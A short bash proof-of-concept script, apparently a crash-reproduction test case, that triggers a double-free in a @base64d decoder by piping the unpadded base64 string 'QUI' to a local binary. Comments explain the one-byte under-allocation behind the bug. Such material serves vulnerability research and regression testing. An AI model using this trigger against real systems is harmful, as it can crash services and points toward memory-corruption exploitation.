# INTENDED_EXIT_CODE: 134
#!/bin/bash
# PoC: double-free in @base64d decoder
#
# The base64 decode allocation formula under-allocates by 1 byte for
# unpadded base64 inputs where len % 4 == 3. The subsequent buffer
# overrun guard frees the result buffer but falls through to the
# normal path, which frees it a second time → double free → SIGABRT.
set -e
cd "$(dirname "$0")"

# "QUI" is base64 for "AB" without padding (len=3, len%4=3).
# decoded_len = (3/4)*3 + (3%4)/2 = 1, but 2 bytes are written,
# triggering the overrun guard's free followed by the normal free.
echo '"QUI"' | ./executable '@base64d'
